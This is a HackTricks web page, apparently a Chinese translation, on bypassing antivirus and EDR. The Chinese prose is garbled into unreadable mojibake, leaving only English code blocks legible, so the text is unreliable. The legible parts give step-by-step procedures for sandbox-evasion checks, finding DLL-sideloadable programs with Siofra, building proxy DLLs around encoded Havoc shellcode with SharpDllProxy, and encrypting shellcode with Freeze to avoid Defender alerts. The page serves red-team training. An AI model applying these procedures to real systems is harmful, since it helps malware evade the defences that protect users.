<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Antivirus (AV) Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="antivirus-av-bypass"><a class="header" href="#antivirus-av-bypass">Antivirus (AV) Bypass</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>å¦‚æœä½ å¯¹ <strong>é»‘å®¢èŒä¸š</strong> æ„Ÿå…´è¶£å¹¶æƒ³è¦æ”»å…‹ä¸å¯æ”»å…‹çš„ç›®æ ‡ - <strong>æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼</strong> (<em>éœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­èƒ½åŠ›</em>).</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<p><strong>æœ¬é¡µé¢ç”±</strong> <a href="https://twitter.com/m2rc_p"><strong>@m2rc_p</strong></a><strong>æ’°å†™ï¼</strong></p>
<h2 id="av-è§„é¿æ–¹æ³•è®º"><a class="header" href="#av-è§„é¿æ–¹æ³•è®º"><strong>AV è§„é¿æ–¹æ³•è®º</strong></a></h2>
<p>ç›®å‰ï¼ŒAV ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ¥æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ¶æ„ï¼ŒåŒ…æ‹¬é™æ€æ£€æµ‹ã€åŠ¨æ€åˆ†æï¼Œä»¥åŠå¯¹äºæ›´é«˜çº§çš„ EDRï¼Œè¡Œä¸ºåˆ†æã€‚</p>
<h3 id="é™æ€æ£€æµ‹"><a class="header" href="#é™æ€æ£€æµ‹"><strong>é™æ€æ£€æµ‹</strong></a></h3>
<p>é™æ€æ£€æµ‹æ˜¯é€šè¿‡æ ‡è®°å·²çŸ¥çš„æ¶æ„å­—ç¬¦ä¸²æˆ–å­—èŠ‚æ•°ç»„åœ¨äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è„šæœ¬ä¸­å®ç°çš„ï¼ŒåŒæ—¶è¿˜æå–æ–‡ä»¶æœ¬èº«çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚æ–‡ä»¶æè¿°ã€å…¬å¸åç§°ã€æ•°å­—ç­¾åã€å›¾æ ‡ã€æ ¡éªŒå’Œç­‰ï¼‰ã€‚è¿™æ„å‘³ç€ä½¿ç”¨å·²çŸ¥çš„å…¬å…±å·¥å…·å¯èƒ½æ›´å®¹æ˜“è¢«æ•è·ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½å·²ç»è¢«åˆ†æå¹¶æ ‡è®°ä¸ºæ¶æ„ã€‚æœ‰å‡ ç§æ–¹æ³•å¯ä»¥ç»•è¿‡è¿™ç§æ£€æµ‹ï¼š</p>
<ul>
<li><strong>åŠ å¯†</strong></li>
</ul>
<p>å¦‚æœä½ åŠ å¯†äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒAV å°†æ— æ³•æ£€æµ‹åˆ°ä½ çš„ç¨‹åºï¼Œä½†ä½ éœ€è¦æŸç§åŠ è½½ç¨‹åºæ¥è§£å¯†å¹¶åœ¨å†…å­˜ä¸­è¿è¡Œç¨‹åºã€‚</p>
<ul>
<li><strong>æ··æ·†</strong></li>
</ul>
<p>æœ‰æ—¶ä½ åªéœ€è¦æ›´æ”¹äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è„šæœ¬ä¸­çš„ä¸€äº›å­—ç¬¦ä¸²å°±å¯ä»¥é€šè¿‡ AVï¼Œä½†è¿™å¯èƒ½æ˜¯ä¸€ä¸ªè€—æ—¶çš„ä»»åŠ¡ï¼Œå…·ä½“å–å†³äºä½ æƒ³è¦æ··æ·†çš„å†…å®¹ã€‚</p>
<ul>
<li><strong>è‡ªå®šä¹‰å·¥å…·</strong></li>
</ul>
<p>å¦‚æœä½ å¼€å‘è‡ªå·±çš„å·¥å…·ï¼Œå°†ä¸ä¼šæœ‰å·²çŸ¥çš„æ¶æ„ç­¾åï¼Œä½†è¿™éœ€è¦å¤§é‡çš„æ—¶é—´å’Œç²¾åŠ›ã€‚</p>
<p>{% hint style="info" %}
æ£€æŸ¥ Windows Defender é™æ€æ£€æµ‹çš„ä¸€ä¸ªå¥½æ–¹æ³•æ˜¯ <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a>ã€‚å®ƒåŸºæœ¬ä¸Šå°†æ–‡ä»¶åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œç„¶åè®© Defender åˆ†åˆ«æ‰«ææ¯ä¸ªéƒ¨åˆ†ï¼Œè¿™æ ·å¯ä»¥å‡†ç¡®å‘Šè¯‰ä½ åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ ‡è®°çš„å­—ç¬¦ä¸²æˆ–å­—èŠ‚ã€‚
{% endhint %}</p>
<p>æˆ‘å¼ºçƒˆå»ºè®®ä½ æŸ¥çœ‹è¿™ä¸ª <a href="https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf">YouTube æ’­æ”¾åˆ—è¡¨</a>ï¼Œå…³äºå®ç”¨çš„ AV è§„é¿ã€‚</p>
<h3 id="åŠ¨æ€åˆ†æ"><a class="header" href="#åŠ¨æ€åˆ†æ"><strong>åŠ¨æ€åˆ†æ</strong></a></h3>
<p>åŠ¨æ€åˆ†ææ˜¯æŒ‡ AV åœ¨æ²™ç®±ä¸­è¿è¡Œä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶ç›‘è§†æ¶æ„æ´»åŠ¨ï¼ˆä¾‹å¦‚ï¼Œå°è¯•è§£å¯†å¹¶è¯»å–æµè§ˆå™¨çš„å¯†ç ï¼Œæ‰§è¡Œ LSASS çš„å°è½¬å‚¨ç­‰ï¼‰ã€‚è¿™ä¸€éƒ¨åˆ†å¯èƒ½æ›´éš¾å¤„ç†ï¼Œä½†è¿™é‡Œæœ‰ä¸€äº›ä½ å¯ä»¥åšçš„äº‹æƒ…æ¥è§„é¿æ²™ç®±ã€‚</p>
<ul>
<li><strong>æ‰§è¡Œå‰ä¼‘çœ </strong> æ ¹æ®å®ç°æ–¹å¼ï¼Œè¿™å¯èƒ½æ˜¯ç»•è¿‡ AV åŠ¨æ€åˆ†æçš„å¥½æ–¹æ³•ã€‚AV æ‰«ææ–‡ä»¶çš„æ—¶é—´éå¸¸çŸ­ï¼Œä»¥å…æ‰“æ–­ç”¨æˆ·çš„å·¥ä½œæµç¨‹ï¼Œå› æ­¤ä½¿ç”¨é•¿æ—¶é—´çš„ä¼‘çœ å¯ä»¥å¹²æ‰°äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æã€‚é—®é¢˜æ˜¯è®¸å¤š AV çš„æ²™ç®±å¯ä»¥æ ¹æ®å®ç°æ–¹å¼è·³è¿‡ä¼‘çœ ã€‚</li>
<li><strong>æ£€æŸ¥æœºå™¨èµ„æº</strong> é€šå¸¸æ²™ç®±å¯ç”¨çš„èµ„æºéå¸¸å°‘ï¼ˆä¾‹å¦‚ &lt; 2GB RAMï¼‰ï¼Œå¦åˆ™å®ƒä»¬å¯èƒ½ä¼šå‡æ…¢ç”¨æˆ·çš„æœºå™¨ã€‚ä½ ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œå‘æŒ¥åˆ›é€ åŠ›ï¼Œä¾‹å¦‚æ£€æŸ¥ CPU çš„æ¸©åº¦æˆ–é£æ‰‡é€Ÿåº¦ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰å†…å®¹éƒ½ä¼šåœ¨æ²™ç®±ä¸­å®ç°ã€‚</li>
<li><strong>ç‰¹å®šæœºå™¨æ£€æŸ¥</strong> å¦‚æœä½ æƒ³é’ˆå¯¹åŠ å…¥ "contoso.local" åŸŸçš„ç”¨æˆ·çš„å·¥ä½œç«™ï¼Œä½ å¯ä»¥æ£€æŸ¥è®¡ç®—æœºçš„åŸŸä»¥æŸ¥çœ‹æ˜¯å¦ä¸æŒ‡å®šçš„åŸŸåŒ¹é…ï¼Œå¦‚æœä¸åŒ¹é…ï¼Œä½ å¯ä»¥è®©ç¨‹åºé€€å‡ºã€‚</li>
</ul>
<p>äº‹å®è¯æ˜ï¼ŒMicrosoft Defender çš„æ²™ç®±è®¡ç®—æœºåæ˜¯ HAL9THï¼Œå› æ­¤ï¼Œä½ å¯ä»¥åœ¨æ¶æ„è½¯ä»¶å¼•çˆ†å‰æ£€æŸ¥è®¡ç®—æœºåï¼Œå¦‚æœåç§°åŒ¹é… HAL9THï¼Œåˆ™æ„å‘³ç€ä½ åœ¨ Defender çš„æ²™ç®±ä¸­ï¼Œå› æ­¤å¯ä»¥è®©ç¨‹åºé€€å‡ºã€‚</p>
<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>æ¥æº: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
<p>ä¸€äº›æ¥è‡ª <a href="https://twitter.com/mariuszbit">@mgeeky</a> çš„éå¸¸å¥½çš„é’ˆå¯¹æ²™ç®±çš„å»ºè®®</p>
<figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">çº¢é˜Ÿ VX Discord</a> #malware-dev é¢‘é“</p></figcaption></figure>
<p>æ­£å¦‚æˆ‘ä»¬åœ¨è¿™ç¯‡æ–‡ç« ä¸­ä¹‹å‰æ‰€è¯´ï¼Œ<strong>å…¬å…±å·¥å…·</strong>æœ€ç»ˆä¼š <strong>è¢«æ£€æµ‹åˆ°</strong>ï¼Œæ‰€ä»¥ä½ åº”è¯¥é—®è‡ªå·±ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³è½¬å‚¨ LSASSï¼Œ<strong>ä½ çœŸçš„éœ€è¦ä½¿ç”¨ mimikatz å—</strong>ï¼Ÿæˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªä¸å¤ªçŸ¥åçš„é¡¹ç›®æ¥è½¬å‚¨ LSASSã€‚</p>
<p>æ­£ç¡®çš„ç­”æ¡ˆå¯èƒ½æ˜¯åè€…ã€‚ä»¥ mimikatz ä¸ºä¾‹ï¼Œå®ƒå¯èƒ½æ˜¯è¢« AV å’Œ EDR æ ‡è®°çš„æœ€å¤šçš„æ¶æ„è½¯ä»¶ä¹‹ä¸€ï¼Œå°½ç®¡è¯¥é¡¹ç›®æœ¬èº«éå¸¸é…·ï¼Œä½†åœ¨ç»•è¿‡ AV æ—¶ä½¿ç”¨å®ƒä¹Ÿæ˜¯ä¸€åœºå™©æ¢¦ï¼Œå› æ­¤åªéœ€å¯»æ‰¾ä½ æƒ³è¦å®ç°çš„ç›®æ ‡çš„æ›¿ä»£æ–¹æ¡ˆã€‚</p>
<p>{% hint style="info" %}
åœ¨ä¿®æ”¹ä½ çš„æœ‰æ•ˆè½½è·ä»¥è¿›è¡Œè§„é¿æ—¶ï¼Œè¯·ç¡®ä¿ <strong>å…³é—­ Defender ä¸­çš„è‡ªåŠ¨æ ·æœ¬æäº¤</strong>ï¼Œå¹¶ä¸”è¯·è®¤çœŸè€ƒè™‘ï¼Œ<strong>å¦‚æœä½ çš„ç›®æ ‡æ˜¯é•¿æœŸè§„é¿ï¼Œè¯·ä¸è¦ä¸Šä¼ åˆ° VIRUSTOTAL</strong>ã€‚å¦‚æœä½ æƒ³æ£€æŸ¥ä½ çš„æœ‰æ•ˆè½½è·æ˜¯å¦è¢«ç‰¹å®š AV æ£€æµ‹åˆ°ï¼Œè¯·åœ¨è™šæ‹Ÿæœºä¸Šå®‰è£…å®ƒï¼Œå°è¯•å…³é—­è‡ªåŠ¨æ ·æœ¬æäº¤ï¼Œå¹¶åœ¨é‚£é‡Œè¿›è¡Œæµ‹è¯•ï¼Œç›´åˆ°ä½ å¯¹ç»“æœæ»¡æ„ä¸ºæ­¢ã€‚
{% endhint %}</p>
<h2 id="exes-ä¸-dlls"><a class="header" href="#exes-ä¸-dlls">EXEs ä¸ DLLs</a></h2>
<p>åªè¦å¯èƒ½ï¼Œå§‹ç»ˆ <strong>ä¼˜å…ˆä½¿ç”¨ DLL è¿›è¡Œè§„é¿</strong>ï¼Œæ ¹æ®æˆ‘çš„ç»éªŒï¼ŒDLL æ–‡ä»¶é€šå¸¸ <strong>è¢«æ£€æµ‹å’Œåˆ†æçš„æ¦‚ç‡è¦ä½å¾—å¤š</strong>ï¼Œå› æ­¤åœ¨æŸäº›æƒ…å†µä¸‹ä½¿ç”¨å®ƒæ¥é¿å…æ£€æµ‹æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æŠ€å·§ï¼ˆå½“ç„¶å‰ææ˜¯ä½ çš„æœ‰æ•ˆè½½è·æœ‰æŸç§æ–¹å¼å¯ä»¥ä½œä¸º DLL è¿è¡Œï¼‰ã€‚</p>
<p>æ­£å¦‚æˆ‘ä»¬åœ¨è¿™å¼ å›¾ç‰‡ä¸­çœ‹åˆ°çš„ï¼ŒHavoc çš„ DLL æœ‰æ•ˆè½½è·åœ¨ antiscan.me ä¸Šçš„æ£€æµ‹ç‡ä¸º 4/26ï¼Œè€Œ EXE æœ‰æ•ˆè½½è·çš„æ£€æµ‹ç‡ä¸º 7/26ã€‚</p>
<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>antiscan.me ä¸Šæ™®é€š Havoc EXE æœ‰æ•ˆè½½è·ä¸æ™®é€š Havoc DLL çš„æ¯”è¾ƒ</p></figcaption></figure>
<p>ç°åœ¨æˆ‘ä»¬å°†å±•ç¤ºä¸€äº›ä½ å¯ä»¥ä½¿ç”¨ DLL æ–‡ä»¶çš„æŠ€å·§ï¼Œä»¥ä¾¿æ›´åŠ éšè”½ã€‚</p>
<h2 id="dll-ä¾§è½½ä¸ä»£ç†"><a class="header" href="#dll-ä¾§è½½ä¸ä»£ç†">DLL ä¾§è½½ä¸ä»£ç†</a></h2>
<p><strong>DLL ä¾§è½½</strong> åˆ©ç”¨åŠ è½½å™¨ä½¿ç”¨çš„ DLL æœç´¢é¡ºåºï¼Œé€šè¿‡å°†å—å®³è€…åº”ç”¨ç¨‹åºå’Œæ¶æ„æœ‰æ•ˆè½½è·å¹¶æ’æ”¾ç½®æ¥å®ç°ã€‚</p>
<p>ä½ å¯ä»¥ä½¿ç”¨ <a href="https://github.com/Cybereason/siofra">Siofra</a> å’Œä»¥ä¸‹ PowerShell è„šæœ¬æ£€æŸ¥æ˜“å— DLL ä¾§è½½æ”»å‡»çš„ç¨‹åºï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-powershell">Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
</code></pre>
<p>{% endcode %}</p>
<p>æ­¤å‘½ä»¤å°†è¾“å‡ºâ€œC:\Program Files\â€ä¸­æ˜“å—DLLåŠ«æŒçš„ç¨‹åºåˆ—è¡¨åŠå…¶å°è¯•åŠ è½½çš„DLLæ–‡ä»¶ã€‚</p>
<p>æˆ‘å¼ºçƒˆå»ºè®®ä½ <strong>è‡ªå·±æ¢ç´¢DLLå¯åŠ«æŒ/å¯ä¾§è½½çš„ç¨‹åº</strong>ï¼Œå¦‚æœæ­£ç¡®æ‰§è¡Œï¼Œè¿™ç§æŠ€æœ¯ç›¸å½“éšè”½ï¼Œä½†å¦‚æœä½ ä½¿ç”¨å…¬å¼€å·²çŸ¥çš„DLLå¯ä¾§è½½ç¨‹åºï¼Œå¯èƒ½ä¼šå¾ˆå®¹æ˜“è¢«æŠ“ä½ã€‚</p>
<p>ä»…ä»…æ”¾ç½®ä¸€ä¸ªæ¶æ„DLLï¼Œå…¶åç§°æ˜¯ç¨‹åºæœŸæœ›åŠ è½½çš„ï¼Œå¹¶ä¸ä¼šåŠ è½½ä½ çš„æœ‰æ•ˆè½½è·ï¼Œå› ä¸ºç¨‹åºæœŸæœ›è¯¥DLLä¸­æœ‰ä¸€äº›ç‰¹å®šçš„å‡½æ•°ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å¦ä¸€ç§æŠ€æœ¯ï¼Œç§°ä¸º<strong>DLLä»£ç†/è½¬å‘</strong>ã€‚</p>
<p><strong>DLLä»£ç†</strong>å°†ç¨‹åºä»ä»£ç†ï¼ˆå’Œæ¶æ„ï¼‰DLLå‘å‡ºçš„è°ƒç”¨è½¬å‘åˆ°åŸå§‹DLLï¼Œä»è€Œä¿ç•™ç¨‹åºçš„åŠŸèƒ½å¹¶èƒ½å¤Ÿå¤„ç†ä½ çš„æœ‰æ•ˆè½½è·çš„æ‰§è¡Œã€‚</p>
<p>æˆ‘å°†ä½¿ç”¨<a href="https://twitter.com/Flangvik/">@flangvik</a>çš„<a href="https://github.com/Flangvik/SharpDllProxy">SharpDLLProxy</a>é¡¹ç›®ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘éµå¾ªçš„æ­¥éª¤ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code>1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
</code></pre>
<p>{% endcode %}</p>
<p>æœ€åä¸€ä¸ªå‘½ä»¤å°†ç»™æˆ‘ä»¬ä¸¤ä¸ªæ–‡ä»¶ï¼šä¸€ä¸ª DLL æºä»£ç æ¨¡æ¿å’Œé‡å‘½ååçš„åŸå§‹ DLLã€‚</p>
<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
<p>{% code overflow="wrap" %}</p>
<pre><code>5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
</code></pre>
<p>{% endcode %}</p>
<p>è¿™äº›æ˜¯ç»“æœï¼š</p>
<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
<p>æˆ‘ä»¬çš„ shellcodeï¼ˆä½¿ç”¨ <a href="https://github.com/EgeBalci/sgn">SGN</a> ç¼–ç ï¼‰å’Œä»£ç† DLL åœ¨ <a href="https://antiscan.me">antiscan.me</a> ä¸Šçš„æ£€æµ‹ç‡ä¸º 0/26ï¼æˆ‘ä¼šç§°ä¹‹ä¸ºæˆåŠŸã€‚</p>
<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
<p>{% hint style="info" %}
æˆ‘ <strong>å¼ºçƒˆæ¨è</strong> ä½ è§‚çœ‹ <a href="https://www.twitch.tv/videos/1644171543">S3cur3Th1sSh1t çš„ twitch VOD</a> å…³äº DLL Sideloadingï¼Œä»¥åŠ <a href="https://www.youtube.com/watch?v=3eROsG_WNpE">ippsec çš„è§†é¢‘</a> ä»¥æ›´æ·±å…¥åœ°äº†è§£æˆ‘ä»¬è®¨è®ºçš„å†…å®¹ã€‚
{% endhint %}</p>
<h2 id="freeze"><a class="header" href="#freeze"><a href="https://github.com/optiv/Freeze"><strong>Freeze</strong></a></a></h2>
<p><code>Freeze æ˜¯ä¸€ä¸ªç”¨äºé€šè¿‡æŒ‚èµ·è¿›ç¨‹ã€ç›´æ¥ç³»ç»Ÿè°ƒç”¨å’Œæ›¿ä»£æ‰§è¡Œæ–¹æ³•ç»•è¿‡ EDR çš„æœ‰æ•ˆè½½è·å·¥å…·åŒ…</code></p>
<p>ä½ å¯ä»¥ä½¿ç”¨ Freeze ä»¥éšç§˜çš„æ–¹å¼åŠ è½½å’Œæ‰§è¡Œä½ çš„ shellcodeã€‚</p>
<pre><code>Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git &amp;&amp; cd Freeze &amp;&amp; go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
</code></pre>
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
<p>{% hint style="info" %}
è§„é¿åªæ˜¯çŒ«å’Œè€é¼ çš„æ¸¸æˆï¼Œä»Šå¤©æœ‰æ•ˆçš„æ–¹æ³•æ˜å¤©å¯èƒ½ä¼šè¢«æ£€æµ‹åˆ°ï¼Œå› æ­¤æ°¸è¿œä¸è¦ä»…ä¾èµ–ä¸€ä¸ªå·¥å…·ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼Œå°è¯•å°†å¤šä¸ªè§„é¿æŠ€æœ¯ç»“åˆèµ·æ¥ã€‚
{% endhint %}</p>
<h2 id="amsiåæ¶æ„è½¯ä»¶æ‰«ææ¥å£"><a class="header" href="#amsiåæ¶æ„è½¯ä»¶æ‰«ææ¥å£">AMSIï¼ˆåæ¶æ„è½¯ä»¶æ‰«ææ¥å£ï¼‰</a></h2>
<p>AMSIçš„åˆ›å»ºæ˜¯ä¸ºäº†é˜²æ­¢â€œ<a href="https://en.wikipedia.org/wiki/Fileless_malware">æ— æ–‡ä»¶æ¶æ„è½¯ä»¶</a>â€ã€‚æœ€åˆï¼ŒAVåªèƒ½æ‰«æ<strong>ç£ç›˜ä¸Šçš„æ–‡ä»¶</strong>ï¼Œå› æ­¤å¦‚æœä½ èƒ½å¤Ÿä»¥æŸç§æ–¹å¼<strong>ç›´æ¥åœ¨å†…å­˜ä¸­</strong>æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼ŒAVå°±æ— æ³•é‡‡å–ä»»ä½•æªæ–½æ¥é˜»æ­¢ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¶³å¤Ÿçš„å¯è§æ€§ã€‚</p>
<p>AMSIåŠŸèƒ½é›†æˆåœ¨Windowsçš„ä»¥ä¸‹ç»„ä»¶ä¸­ã€‚</p>
<ul>
<li>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼Œæˆ–UACï¼ˆEXEã€COMã€MSIæˆ–ActiveXå®‰è£…çš„æå‡ï¼‰</li>
<li>PowerShellï¼ˆè„šæœ¬ã€äº¤äº’ä½¿ç”¨å’ŒåŠ¨æ€ä»£ç è¯„ä¼°ï¼‰</li>
<li>Windowsè„šæœ¬ä¸»æœºï¼ˆwscript.exeå’Œcscript.exeï¼‰</li>
<li>JavaScriptå’ŒVBScript</li>
<li>Office VBAå®</li>
</ul>
